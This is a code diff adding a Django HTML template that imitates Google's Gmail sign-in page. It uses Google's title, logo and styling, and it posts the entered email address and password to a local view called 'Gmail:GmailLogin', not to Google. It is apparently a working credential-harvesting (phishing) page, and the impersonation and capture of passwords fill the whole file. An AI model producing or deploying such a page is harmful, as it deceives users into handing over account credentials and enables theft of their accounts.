@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in – Google Accounts</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background: white;
+      width: 400px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      padding: 40px 32px;
+      text-align: center;
+    }
+
+    .gmail-logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      margin: 0;
+      font-weight: normal;
+      font-size: 24px;
+    }
+
+    p {
+      color: #5f6368;
+      font-size: 14px;
+      margin-top: 6px;
+      margin-bottom: 24px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 12px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+    }
+
+    .link {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .link a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .create-account {
+      background: none;
+      border: none;
+      color: #1a73e8;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .next-btn {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .next-btn:hover {
+      background-color: #1669c1;
+    }
+  </style>
+</head>
+<body>
+  <form action="{% url 'Gmail:GmailLogin' %}" method="post">
+    {% csrf_token %}
+    <div class="login-container">
+    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" alt="Gmail Logo" class="gmail-logo">
+    <h2>Sign in</h2>
+    <p>to continue to Gmail</p>
+
+    <input type="email" placeholder="Email or phone"  name="email">
+    <div class="link"><a href="#">Forgot email?</a></div>
+
+    <input type="password" placeholder="Enter your password" name="password">
+    <div class="link"><a href="#">Forgot password?</a></div>
+
+    <div class="buttons">
+      <button class="create-account">Create account</button>
+      <button class="next-btn">Login</button>
+    </div>
+  </div>
+
+  </form>
+</body>
+</html>
